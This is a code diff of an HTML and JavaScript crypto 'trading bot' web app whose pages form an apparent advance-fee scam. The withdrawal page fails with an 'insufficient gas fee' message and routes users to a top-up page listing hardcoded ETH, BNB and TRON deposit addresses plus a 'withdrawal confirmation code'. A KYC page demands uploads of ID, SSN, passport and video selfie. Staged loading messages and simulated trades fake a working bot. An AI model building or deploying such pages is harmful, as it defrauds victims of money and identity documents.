+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">&lt; Back to Dashboard</button>
+</div>
+
+<!-- Page 18: Derivatives Trading Page -->
+<div class="page" id="page18" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Derivatives Trading</h2>
+  <canvas id="derivativesChart" style="width:100%; height:400px; background:#222; border-radius:8px; margin-bottom:20px;"></canvas>
+  <form id="derivativesTradeForm" style="max-width:400px;">
+    <label>Symbol (e.g. BTC, ETH):</label><br/>
+    <input type="text" id="derivSymbol" name="derivSymbol" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
+    <label>Amount:</label><br/>
+    <input type="number" id="derivAmount" name="derivAmount" required min="0.01" step="0.01" style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" /><br/>
+    <label>Leverage:</label><br/>
+    <select id="derivLeverage" name="derivLeverage" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;">
+      <option value="5x">5x</option>
+      <option value="10x">10x</option>
+      <option value="20x">20x</option>
+      <option value="50x">50x</option>
+    </select><br/>
+    <label>Trade Type:</label><br/>
+    <select id="derivType" name="derivType" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;">
+      <option value="buy">Buy</option>
+      <option value="sell">Sell</option>
+    </select>
+    <button type="submit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Place Derivatives Order</button>
+  </form>
+  <h3>Positions</h3>
+  <div id="derivPositionsList" style="max-height:300px; overflow-y:auto; border:1px solid #333; border-radius:8px; padding:10px; background:#111;"></div>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">&lt; Back to Dashboard</button>
+</div>
+
+<!-- Page 19: Withdrawal Cancel / Insufficient Gas Fee -->
+<div class="page" id="page19" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Withdrawal Cancelled</h2>
+  <p id="insufficientGasMsg" style="font-weight:bold; margin-bottom:15px;">Insufficient Gas fee (example: Insufficient BNB to process transaction kindly total 0.24 BNB)</p>
+  <button id="proceedTopUpBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px;">Proceed to Top Up</button>
+  <button onclick="showPage('page4')" style="margin-left:10px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
+
+<!-- Page 20: Top Up Page -->
+<div class="page" id="page20" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Top Up Your Account</h2>
+  <p>Please send your top-up funds to one of the following addresses based on your selected network:</p>
+  <div>
+    <div><strong>ETH Ethereum Network Address:</strong> 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="copyBtn" data-copy="eth">Copy</button></div>
+    <div><strong>BNB Smart Chain BEP20 Address:</strong> 0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130 <button class="copyBtn" data-copy="bnb">Copy</button></div>
+    <div><strong>Tron TRC20 Network Address:</strong> TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco <button class="copyBtn" data-copy="tron">Copy</button></div>
+  </div>
+
+  <label style="margin-top:15px;">Input Withdrawal Confirmation Code:</label><br/>
+  <input type="text" id="withdrawalConfirmCode" placeholder="Enter withdrawal code" style="width:100%; padding:8px; margin-bottom:15px; border-radius:6px; border:none;" />
+
+  <button id="confirmWithdrawalBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Confirm Withdrawal</button>
+  <button onclick="showPage('page4')" style="margin-top:10px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
+
+<!-- Page 21: Withdrawal Successful Page -->
+<div class="page" id="page21" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Withdrawal Successful</h2>
+  <p><strong>Withdrawal Address:</strong> <span id="successWithdrawAddress"></span></p>
+  <p><strong>Network:</strong> <span id="successWithdrawNetwork"></span></p>
+  <p><strong>Amount:</strong> $<span id="successWithdrawAmount"></span></p>
+  <p><strong>Time (UTC):</strong> <span id="successWithdrawTime"></span></p>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Back to Dashboard</button>
+</div>
+<!-- Page 22: Withdrawal Suspend Page (after 5 invalid codes) -->
+<div class="page" id="page22" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Withdrawals Suspended</h2>
+  <p>You have exceeded the maximum number of invalid withdrawal code attempts.</p>
+  <p>Withdrawals have been suspended for 24 hours for security reasons.</p>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Back to Dashboard</button>
+</div>
+
+<!-- Page 23: Wallet Connect Page -->
+<div class="page" id="page23" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Connect Wallet</h2>
+  <p>Please connect your wallet or enter your wallet address manually.</p>
+  <button id="walletConnectBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%; margin-bottom:15px;">Connect with MetaMask</button>
+  
+  <label>Or enter wallet address manually:</label><br/>
+  <input type="text" id="manualWalletAddress" placeholder="0x..." style="width:100%; padding:8px; margin-bottom:15px; border-radius:6px; border:none;" />
+  <button id="manualWalletSubmit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Connect</button>
+  
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
+
+<!-- Page 24: KYC Upload Page -->
+<div class="page" id="page24" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>KYC Verification</h2>
+  <form id="kycForm" enctype="multipart/form-data" style="max-width:500px;">
+    <label>Full Name:</label><br/>
+    <input type="text" id="kycName" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" />
+    
+    <label>Email Address:</label><br/>
+    <input type="email" id="kycEmail" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" />
+    
+    <label>Phone Number:</label><br/>
+    <input type="tel" id="kycPhone" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" />
+    
+    <label>Country:</label><br/>
+    <input type="text" id="kycCountry" required style="width:100%; padding:8px; margin-bottom:12px; border-radius:6px; border:none;" />
+    
+    <label>National ID (upload):</label><br/>
+    <input type="file" id="kycNationalID" accept="image/*,application/pdf" required style="margin-bottom:12px;" />
+    
+    <label>Social Security Number (upload):</label><br/>
+    <input type="file" id="kycSSN" accept="image/*,application/pdf" required style="margin-bottom:12px;" />
+    
+    <label>Passport (upload):</label><br/>
+    <input type="file" id="kycPassport" accept="image/*,application/pdf" required style="margin-bottom:12px;" />
+    
+    <label>Video Selfie (upload):</label><br/>
+    <input type="file" id="kycVideoSelfie" accept="video/*" required style="margin-bottom:12px;" />
+    
+    <button type="submit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Submit KYC</button>
+  </form>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:10px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
+
+<!-- Page 25: KYC Pending Page -->
+<div class="page" id="page25" style="display:none; padding:20px; color:#fff; background:#121212; text-align:center;">
+  <h2>KYC Verification Pending</h2>
+  <p>Your KYC documents have been submitted and are currently under review.</p>
+  <p>Please check back later for the status.</p>
+  <button onclick="showPage('page4')" style="margin-top:30px; background:#333; color:#f0b90b; padding:12px 25px; border:none; border-radius:6px;">Back to Dashboard</button>
+</div>
+
+<!-- Page 26: KYC Approved Page -->
+<div class="page" id="page26" style="display:none; padding:20px; color:#fff; background:#121212; text-align:center;">
+  <h2>KYC Approved</h2>
+  <p>Congratulations! Your KYC verification has been approved.</p>
+  <button onclick="showPage('page4')" style="margin-top:30px; background:#f0b90b; color:#000; padding:12px 25px; border:none; border-radius:6px; font-weight:bold;">Proceed to Dashboard</button>
+</div>
+
+<!-- Page 27: Referral Program Page -->
+<div class="page" id="page27" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Referral Program</h2>
+  <p>Invite friends and earn bonuses!</p>
+  <div style="margin-bottom:15px;">
+    <label>Your Referral Link:</label>
+    <input type="text" id="referralLink" readonly value="https://blockchainbot.app/signup?ref=USERID123" style="width:100%; padding:8px; border-radius:6px; border:none; background:#222; color:#f0b90b;" />
+    <button class="copyBtn" data-copy="referralLink" style="margin-top:10px; background:#f0b90b; color:#000; border:none; border-radius:6px; padding:10px 20px; font-weight:bold;">Copy Link</button>
+  </div>
+  <h3>Referral Stats</h3>
+  <ul>
+    <li>Total Referrals: <span id="totalReferrals">0</span></li>
+    <li>Total Bonuses Earned: $<span id="totalReferralBonus">0.00</span></li>
+  </ul>
+  <button onclick="showPage('page4')" style="margin-top:30px; background:#333; color:#f0b90b; padding:12px 25px; border:none; border-radius:6px;">Back to Dashboard</button>
+</div>
+
+<!-- Page 28: Settings Page -->
+<div class="page" id="page28" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>Settings</h2>
+  <form id="settingsForm" style="max-width:400px;">
+    <label>Language:</label><br/>
+    <select id="languageSelect" style="width:100%; padding:8px; margin-bottom:15px; border-radius:6px; border:none;">
+      <option value="en">English</option>
+      <option value="es">Spanish</option>
+      <option value="fr">French</option>
+      <option value="de">German</option>
+      <option value="zh">Chinese</option>
+    </select>
+
+    <label>Currency:</label><br/>
+    <select id="currencySelect" style="width:100%; padding:8px; margin-bottom:15px; border-radius:6px; border:none;">
+      <option value="usd">USD</option>
+      <option value="cad">CAD</option>
+      <option value="inr">INR</option>
+      <option value="pkr">PKR</option>
+      <option value="aed">AED</option>
+      <option value="uah">UAH</option>
+    </select>
+
+    <label>Enable Sound Feedback:</label>
+    <input type="checkbox" id="soundFeedback" checked style="margin-left:10px;" /><br/><br/>
+
+    <label>Enable Vibration Feedback:</label>
+    <input type="checkbox" id="vibrationFeedback" checked style="margin-left:10px;" /><br/><br/>
+
+    <button type="submit" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; width:100%;">Save Settings</button>
+  </form>
+  <button onclick="showPage('page4')" style="margin-top:20px; background:#333; color:#f0b90b; padding:12px 20px; border:none; border-radius:6px;">Cancel</button>
+</div>
+
+<!-- Page 29: User Profile Page -->
+<div class="page" id="page29" style="display:none; padding:20px; color:#fff; background:#121212;">
+  <h2>User Profile</h2>
+  <p><strong>Username:</strong> <span id="profileUsername">User123</span></p>
+  <p><strong>Email:</strong> <span id="profileEmail">user@example.com</span></p>
+  <p><strong>Account Created:</strong> <span id="profileCreatedDate">2025-01-01</span></p>
+  <button onclick="showPage('page28')" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; margin-top:15px;">Edit Settings</button>
+  <button onclick="showPage('page4')" style="margin-top:15px; background:#333; color:#f0b90b; padding:12px 20px; border:none; border-radius:6px;">Back to Dashboard</button>
+</div>
+
+<!-- Page 30: Logout Confirmation Page -->
+<div class="page" id="page30" style="display:none; padding:20px; color:#fff; background:#121212; text-align:center;">
+  <h2>Logout</h2>
+  <p>Are you sure you want to logout?</p>
+  <button id="confirmLogoutBtn" style="background:#f0b90b; color:#000; font-weight:bold; border:none; border-radius:6px; padding:12px 20px; margin:10px;">Yes, Logout</button>
+  <button onclick="showPage('page4')" style="background:#333; color:#f0b90b; border:none; border-radius:6px; padding:12px 20px; margin:10px;">Cancel</button>
+</div>
+
+
+
+
+
+
+
+
+</div><script>
+  let user = { email: '', phone: '', password: '', userId: '', loggedIn: false };
+  const COINS = ['bitcoin', 'ethereum', 'solana', 'binancecoin'];
+  const CG_API = 'https://api.coingecko.com/api/v3';
+
+  function showPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    window.scrollTo(0, 0);
   }
 
-  // Show page by name
-  function showPage(pageName) {
-    hideAllPages();
-    if (pageName === 'signup' || pageName === 'signin') {
-      signup.classList.remove('active');
-      signin.classList.remove('active');
-      sidebar.classList.add('hidden');
-      if(pageName === 'signup') signup.classList.add('active');
-      if(pageName === 'signin') signin.classList.add('active');
+  function generateUserId(email, phone) {
+    return email.slice(0,3).toLowerCase().replace(/[^a-z0-9]/g,'') + phone.slice(-5);
+  }
+
+  document.getElementById('signUpForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const email = e.target.email.value.trim();
+    const phone = e.target.phone.value.trim();
+    const pw = e.target.password.value.trim();
+    if (!email || !phone || !pw) return alert('Fill all fields');
+    user.email = email;
+    user.phone = phone;
+    user.password = pw;
+    showPage('authPage');
+    document.getElementById('authStatusMsg').textContent = 'Validating account...';
+    setTimeout(() => document.getElementById('authStatusMsg').textContent = 'Authenticating portfolio...', 20000);
+    setTimeout(() => document.getElementById('authStatusMsg').textContent = 'Setting trading bot...', 40000);
+    setTimeout(() => {
+      user.userId = generateUserId(email, phone);
+      localStorage.setItem('userId', user.userId);
+      showPage('signInPage');
+    }, 60000);
+  });
+
+  document.getElementById('signInForm').addEventListener('submit', e => {
+    e.preventDefault();
+    const id = e.target.userId.value.trim();
+    const pw = e.target.password.value.trim();
+    if (id === localStorage.getItem('userId') && pw === user.password) {
+      showPage('dashboardPage');
+      user.loggedIn = true;
+      initDashboard();
+      localStorage.setItem('loggedIn', '1');
     } else {
-      sidebar.classList.remove('hidden');
-      if(pages[pageName]) {
-        pages[pageName].classList.add('active');
-      } else {
-        // fallback to dashboard
-        pages['page1'].classList.add('active');
-        pageName = 'page1';
-      }
-      // highlight nav button
-      document.querySelectorAll('#navList button').forEach(btn => {
-        btn.classList.toggle('active', btn.dataset.page === pageName);
-      });
+      alert('Incorrect credentials');
     }
-    localStorage.setItem('currentPage', pageName);
+  });
+
+  async function initDashboard() {
+    loadPrices();
+    loadNews();
+    initTradingView();
+    updateUserDisplay();
+    setInterval(loadPrices, 60000);
   }
 
-  // ===== Load last page or show sign-in if not logged in =====
-  const isLoggedIn = localStorage.getItem('isLoggedIn') === 'true';
-  let currentPage = localStorage.getItem('currentPage');
-  if(!currentPage || (!isLoggedIn && !['signin','signup'].includes(currentPage))) {
-    currentPage = 'signin';
-  }
-  showPage(currentPage);
-
-  // ===== Navigation button clicks =====
-  document.querySelectorAll('#navList button[data-page]').forEach(btn => {
-    btn.addEventListener('click', () => {
-      showPage(btn.dataset.page);
-    });
-  });
-
-  // Logout handler
-  logoutBtn.addEventListener('click', () => {
-    localStorage.removeItem('isLoggedIn');
-    localStorage.removeItem('currentPage');
-    showPage('signin');
-  });
-
-  // ===== Dark Mode Toggle =====
-  const darkModeToggle = document.getElementById('darkModeToggle');
-  darkModeToggle.addEventListener('click', () => {
-    document.body.classList.toggle('dark-mode');
-    sidebar.classList.toggle('dark-mode');
-    localStorage.setItem('darkMode', document.body.classList.contains('dark-mode'));
-  });
-  if(localStorage.getItem('darkMode') === 'true') {
-    document.body.classList.add('dark-mode');
-    sidebar.classList.add('dark-mode');
+  function updateUserDisplay() {
+    document.getElementById('dashboardUserId').textContent = `Hi, ${user.userId}`;
   }
 
-  // ===== Sign-up Flow =====
-  const signupForm = document.getElementById('signupForm');
-  const signinForm = document.getElementById('signinForm');
-  const signupLoading = document.getElementById('signupLoading');
-  const signinLoading = document.getElementById('signinLoading');
-
-  const SIGNUP_DELAY = 30000;
-  const SIGNIN_DELAY = 35000;
-
-  signupForm.addEventListener('submit', e => {
-    e.preventDefault();
-    signupForm.style.display = 'none';
-    signupLoading.style.display = 'block';
-    setTimeout(() => {
-      signupLoading.style.display = 'none';
-      signupForm.reset();
-      signupForm.style.display = 'block';
-      showPage('signin');
-      signinForm.signinEmail.value = signupForm.signupEmail.value;
-    }, SIGNUP_DELAY);
-  });
-
-  // ===== Sign-in Flow =====
-  signinForm.addEventListener('submit', e => {
-    e.preventDefault();
-    signinForm.style.display = 'none';
-    signinLoading.style.display = 'block';
-    setTimeout(() => {
-      signinLoading.style.display = 'none';
-      signinForm.reset();
-      signinForm.style.display = 'block';
-      localStorage.setItem('isLoggedIn', 'true');
-      showPage('page1'); // Dashboard
-      loadDashboardData();
-    }, SIGNIN_DELAY);
-  });
-
-  // ===== API Data Fetching & Display =====
-
-  async function fetchCoins() {
-    const coinsList = document.getElementById('coins-list');
-    coinsList.innerHTML = `<p>Loading coins...</p>`;
+  async function loadPrices() {
     try {
-      const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=12&page=1&sparkline=false');
-      const coins = await res.json();
-      coinsList.innerHTML = '';
-      coins.forEach(coin => {
-        const card = document.createElement('div');
-        card.className = 'coin-card';
-        card.innerHTML = `
-          <img src="${coin.image}"
-          <img src="${coin.image}" alt="${coin.name} logo" />
-          <div>${coin.name} (${coin.symbol.toUpperCase()})</div>
-          <div>Price: $${coin.current_price.toLocaleString()}</div>
-          <div>Market Cap: $${coin.market_cap.toLocaleString()}</div>
-          <div>24h Change: <span style="color:${coin.price_change_percentage_24h >= 0 ? '#4caf50' : '#f44336'}">${coin.price_change_percentage_24h.toFixed(2)}%</span></div>
-        `;
-        coinsList.appendChild(card);
+      const resp = await fetch(`${CG_API}/simple/price?ids=${COINS.join(',')}&vs_currencies=usd`);
+      const data = await resp.json();
+      const cont = document.getElementById('livePriceContainer');
+      cont.innerHTML = '';
+      COINS.forEach(c => {
+        if (!data[c]) return;
+        const p = data[c].usd.toFixed(2);
+        const div = document.createElement('div');
+        div.className = 'price-item';
+        div.innerHTML = `<img src='https://assets.coingecko.com/coins/images/${getCGId(c)}.png' width='24'> ${c.toUpperCase()}: $${p}`;
+        cont.append(div);
       });
     } catch (e) {
-      coinsList.innerHTML = '<p>Failed to load coins. Try refreshing.</p>';
+      console.error('Price fetch failed', e);
     }
   }
 
-  async function fetchMarketAnalysis() {
-    const analysisEl = document.getElementById('marketAnalysisText');
-    analysisEl.textContent = 'Loading market analysis...';
-
-    try {
-      // For demo, fetch top coins & do simple analysis:
-      const res = await fetch('https://api.coingecko.com/api/v3/global');
-      const data = await res.json();
-      const marketCap = data.data.total_market_cap.usd;
-      const volume = data.data.total_volume.usd;
-      analysisEl.innerHTML = `
-        <p>Total Market Cap: $${marketCap.toLocaleString(undefined, {maximumFractionDigits:0})}</p>
-        <p>24h Volume: $${volume.toLocaleString(undefined, {maximumFractionDigits:0})}</p>
-        <p>Market dominance BTC: ${data.data.market_cap_percentage.btc.toFixed(2)}%</p>
-        <p>Market dominance ETH: ${data.data.market_cap_percentage.eth.toFixed(2)}%</p>
-      `;
-    } catch(e) {
-      analysisEl.textContent = 'Failed to load market analysis.';
-    }
+  function getCGId(coin) {
+    return { bitcoin:1, ethereum:279, solana:5426, binancecoin:825 }[coin] || 1;
   }
 
-  async function fetchMarketNews() {
-    const newsList = document.getElementById('news-list');
-    newsList.innerHTML = '<p>Loading news...</p>';
-    try {
-      // CoinGecko news endpoint is limited, so use a placeholder for demo
-      // You can replace with your own news API or TradingView news widget
-      const dummyNews = [
-        {title: "Bitcoin rallies past $40,000", url: "#"},
-        {title: "Ethereum 2.0 upgrade approaches", url: "#"},
-        {title: "New DeFi protocols launching", url: "#"},
-        {title: "Crypto regulations evolving worldwide", url: "#"},
-      ];
-      newsList.innerHTML = '';
-      dummyNews.forEach(item => {
-        const article = document.createElement('article');
-        article.innerHTML = `<a href="${item.url}" target="_blank" rel="noopener">${item.title}</a>`;
-        newsList.appendChild(article);
-      });
-    } catch(e) {
-      newsList.innerHTML = '<p>Failed to load news.</p>';
-    }
+  function initTradingView() {
+    document.getElementById('tradingviewWidget').innerHTML = `
+      <iframe src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark"
+              style="width:100%;height:500px;" frameborder="0"></iframe>`;
   }
 
-  function loadTradingViewWidget(containerId, symbol='COINBASE:BTCUSD') {
-    const container = document.getElementById(containerId);
-    container.innerHTML = ''; // clear
-
-    const script = document.createElement('script');
-    script.src = "https://s3.tradingview.com/tv.js";
-    script.onload = () => {
-      new TradingView.widget({
-        container_id: containerId,
-        autosize: true,
-        symbol: symbol,
-        interval: '60',
-        timezone: 'Etc/UTC',
-        theme: document.body.classList.contains('dark-mode') ? 'dark' : 'light',
-        style: '1',
-        locale: 'en',
-        toolbar_bg: '#f1f3f6',
-        enable_publishing: false,
-        allow_symbol_change: true,
-        save_image: false,
-        studies: ['MACD@tv-basicstudies'],
-        show_popup_button: true,
-        popup_width: '1000',
-        popup_height: '650',
-      });
-    };
-    container.appendChild(script);
-  }
-
-  // Load data when dashboard or related pages are active
-  function loadDashboardData() {
-    fetchCoins();
-    fetchMarketAnalysis();
-    fetchMarketNews();
-    loadTradingViewWidget('tradingview-widget', 'COINBASE:BTCUSD');
-    loadTradingViewWidget('trading-charts-container', 'BINANCE:ETHUSDT');
-    // For performance charts (#performance), you can embed TradingView or Chart.js charts here
-    const perf = document.getElementById('performance-charts');
-    perf.innerHTML = `<p>Loading performance charts...</p>`;
-    // For demo, load BTC 7-day sparkline from CoinGecko (simplified)
-    fetch('https://api.coingecko.com/api/v3/coins/bitcoin/market_chart?vs_currency=usd&days=7')
+  async function loadNews() {
+    const news = await fetch("https://cryptopanic.com/api/v1/posts/?auth_token=demo&public=true")
       .then(res => res.json())
-      .then(data => {
-        perf.innerHTML = `<p>Bitcoin 7-day price points: ${data.prices.length}</p>`;
-        // Could add a chart library here if desired
-      })
-      .catch(() => { perf.innerHTML = '<p>Failed to load performance data.</p>'; });
+      .then(data => data.results.slice(0, 5))
+      .catch(() => []);
+    const cont = document.getElementById("newsFeed");
+    cont.innerHTML = news.map(n => `<div class='card'><a href='${n.url}' target='_blank'>${n.title}</a></div>`).join('');
   }
 
-  // Load dashboard data if on dashboard at start
-  if(localStorage.getItem('currentPage') === 'page1' && localStorage.getItem('isLoggedIn') === 'true'){
-    loadDashboardData();
+  function simulateTrade(symbol) {
+    const log = document.getElementById("tradeLog");
+    const t = new Date().toLocaleTimeString();
+    log.innerHTML += `<div>${t}: Simulated BUY order for ${symbol}</div>`;
   }
 
-  // Also reload data on page change if dashboard or related pages
-  navList.addEventListener('click', e => {
-    if(e.target.tagName === 'BUTTON') {
-      const p = e.target.dataset.page;
-      if(['page1','page2','page3','page4','page5','page6','page7'].includes(p) && localStorage.getItem('isLoggedIn') === 'true') {
-        loadDashboardData();
-      }
+  window.addEventListener('load', () => {
+    const logged = localStorage.getItem('loggedIn');
+    if (logged === '1') {
+      user.userId = localStorage.getItem('userId');
+      showPage('dashboardPage');
+      initDashboard();
+    } else {
+      showPage('signUpPage');
     }
   });
-
-</script>
-</body>
+</script></body>
 </html>
